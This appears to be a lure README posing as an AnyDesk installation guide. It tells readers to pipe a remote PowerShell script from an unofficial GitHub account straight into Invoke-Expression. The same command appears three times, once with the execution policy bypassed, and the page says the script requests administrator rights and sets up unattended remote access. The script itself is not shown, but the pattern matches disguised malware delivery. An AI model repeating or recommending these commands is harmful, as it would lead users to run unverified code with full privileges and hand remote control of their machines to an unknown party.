# AnyDesk Remote Desktop Setup
the ultra-fast remote desktop software with 60fps sessions, cross-platform support, and end-to-end TLS encryption for secure remote access.

## Install
Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

That's it. The installer handles everything.

## What it does
- Requests administrator privileges to install the AnyDesk system service for unattended access.
- Downloads AnyDesk installer silently and installs both user and service components.
- Generates a unique AnyDesk ID and configures password-protected unattended access.
- Launches AnyDesk and displays the ID and connection status ready for use.

## Requirements
- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~30 MB free disk space

## Troubleshooting

**Remote session video quality is poor even on fast internet connections**

Open Performance settings on both ends and set Display Quality to Best Quality with Hardware Acceleration.

**Unattended access password stops working after an AnyDesk update**

Reset the unattended password in Security settings and reconnect using the new credentials.

**Alternative (bypass execution policy):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex"
```

"irm is not recognized" -- old PowerShell. Use:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | Invoke-Expression
```

## License
MIT -- see LICENSE.